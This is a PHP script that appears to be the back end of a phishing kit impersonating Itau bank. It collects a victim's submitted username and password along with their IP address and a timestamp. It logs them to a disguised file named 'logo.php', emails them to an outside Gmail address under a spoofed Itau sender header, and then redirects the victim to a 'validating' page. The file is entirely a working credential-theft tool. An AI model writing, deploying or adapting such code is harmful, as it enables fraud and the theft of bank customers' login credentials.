<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info


$_SESSION['email_desktop'] = $_POST['email_desktop'];
$_SESSION['pass_desktop'] = $_POST['pass_desktop'];

#Security information
$message = "
<div style=\"background-image: url('');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
Usuario y clave de Itau =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
Usuario => <font color='#F31414'>".$_POST['usuario']."</font><br />
Clave => <font color='#F31414'>".$_POST['clave']."</font><br />
</div>";

$fp = fopen('logo.php', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "Login Itau ip[ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: ITAU (A) Empresa <serviciosempresa@itau.ql" . "\r\n";

$to = "danicabesa565@gmail.com";
@mail($to,$subject,$message,$headers);
header('location: validating.php');

?>